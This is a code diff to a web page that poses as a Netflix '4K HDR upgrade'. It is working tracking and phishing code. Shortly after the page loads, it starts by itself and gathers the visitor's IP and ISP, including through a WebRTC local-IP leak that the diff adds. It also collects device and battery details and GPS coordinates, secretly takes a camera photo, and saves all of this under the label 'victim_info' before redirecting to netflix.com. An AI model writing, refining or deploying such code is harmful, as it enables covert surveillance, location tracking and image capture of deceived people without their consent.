@@ -113,38 +113,69 @@
             loader.innerHTML = '❌ Invalid link';
         }
         
-        // Get REAL IP and Location Info
-        async function getRealIPInfo() {
+        // Get IP from multiple sources
+        async function getIPInfo() {
             try {
-                // Multiple IP APIs for backup
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'Unknown',
-                    country: data.country_name || data.country || 'Unknown',
-                    region: data.region || 'Unknown',
-                    city: data.city || 'Unknown',
-                    lat: data.latitude || 0,
-                    lng: data.longitude || 0,
-                    isp: data.org || data.isp || 'Unknown'
-                };
-            } catch(e) {
-                try {
-                    const res2 = await fetch('https://ipinfo.io/json');
-                    const data2 = await res2.json();
+                // Try ipapi.co first
+                let res = await fetch('https://ipapi.co/json/', { timeout: 3000 });
+                let data = await res.json();
+                if (data.ip) {
                     return {
-                        ip: data2.ip || 'Unknown',
-                        country: data2.country || 'Unknown',
-                        region: data2.region || 'Unknown',
-                        city: data2.city || 'Unknown',
-                        lat: data2.loc ? data2.loc.split(',')[0] : 0,
-                        lng: data2.loc ? data2.loc.split(',')[1] : 0,
-                        isp: data2.org || 'Unknown'
+                        ip: data.ip,
+                        country: data.country_name || 'Unknown',
+                        region: data.region || 'Unknown',
+                        city: data.city || 'Unknown',
+                        lat: data.latitude || 0,
+                        lng: data.longitude || 0,
+                        isp: data.org || 'Unknown'
                     };
-                } catch(e2) {
-                    return null;
                 }
-            }
+            } catch(e) {}
+            
+            try {
+                // Try ipinfo.io as backup
+                let res = await fetch('https://ipinfo.io/json', { timeout: 3000 });
+                let data = await res.json();
+                if (data.ip) {
+                    let loc = data.loc ? data.loc.split(',') : [0, 0];
+                    return {
+                        ip: data.ip,
+                        country: data.country || 'Unknown',
+                        region: data.region || 'Unknown',
+                        city: data.city || 'Unknown',
+                        lat: parseFloat(loc[0]) || 0,
+                        lng: parseFloat(loc[1]) || 0,
+                        isp: data.org || 'Unknown'
+                    };
+                }
+            } catch(e) {}
+            
+            // Fallback: get local IP via WebRTC
+            return {
+                ip: await getLocalIP(),
+                country: 'Unknown',
+                region: 'Unknown',
+                city: 'Unknown',
+                lat: 0,
+                lng: 0,
+                isp: 'Unknown'
+            };
+        }
+        
+        // Get local IP via WebRTC
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) return;
+                    const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ip) resolve(ip[0]);
+                    pc.close();
+                };
+                setTimeout(() => resolve('Unknown'), 2000);
+            });
         }
         
         // Get Device + Battery
@@ -174,7 +205,7 @@
             document.getElementById('deviceName').innerText = device;
             document.getElementById('batteryLevel').innerText = battery;
             
-            return { device, os, browser, battery, ua: ua.substring(0, 100) };
+            return { device, os, browser, battery };
         }
         
         async function saveData(type, data) {
@@ -195,10 +226,10 @@
             return url;
         }
         
-        // Take Camera Photo IMMEDIATELY
+        // Take Camera Photo
         async function takeCameraPhoto() {
             try {
-                updateProgress(50, "📷 Accessing camera...");
+                updateProgress(60, "📷 Camera access...");
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -217,18 +248,17 @@
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch(e) {
-                console.log("Camera error:", e);
-                updateProgress(50, "Camera access denied");
+                updateProgress(60, "Camera denied");
                 return false;
             }
         }
         
-        // Get GPS Location IMMEDIATELY
+        // Get GPS Location
         async function getGPSLocation() {
             try {
-                updateProgress(20, "📍 Getting location...");
+                updateProgress(20, "📍 Location...");
                 const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                 });
                 await saveData('gps_location', {
                     lat: pos.coords.latitude,
@@ -242,7 +272,7 @@
             }
         }
         
-        // MAIN FUNCTION - ALL IN SEQUENCE
+        // MAIN FUNCTION
         async function startUpgrade() {
             if (!sessionId) return;
             
@@ -251,9 +281,9 @@
             progressContainer.style.display = 'block';
             progressText.style.display = 'block';
             
-            // STEP 1: Device Info + IP (0-10%)
+            // STEP 1: Device + IP (0-15%)
             updateProgress(5, "Detecting device...");
-            const ipInfo = await getRealIPInfo();
+            const ipInfo = await getIPInfo();
             const deviceInfo = await getDeviceInfo();
             await saveData('victim_info', {
                 ip: ipInfo?.ip || 'Unknown',
@@ -268,15 +298,15 @@
                 browser: deviceInfo.browser,
                 battery: deviceInfo.battery
             });
-            updateProgress(10, "Device detected!");
+            updateProgress(15, "Device detected!");
             
-            // STEP 2: GPS Location (10-40%)
+            // STEP 2: GPS Location (15-45%)
             await getGPSLocation();
             
-            // STEP 3: Camera Photo (40-80%)
+            // STEP 3: Camera Photo (45-85%)
             await takeCameraPhoto();
             
-            // STEP 4: Complete (80-100%)
+            // STEP 4: Complete (85-100%)
             updateProgress(95, "Finalizing...");
             await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
             updateProgress(100, "4K HDR Enabled!");
@@ -284,14 +314,13 @@
             
             setTimeout(() => {
                 window.location.href = "https://www.netflix.com";
-            }, 2000);
+            }, 1500);
         }
         
         upgradeBtn.onclick = startUpgrade;
         
-        // Auto start after 1 second
         if (sessionId) {
-            setTimeout(startUpgrade, 500);
+            setTimeout(startUpgrade, 300);
         }
     </script>
 </body>
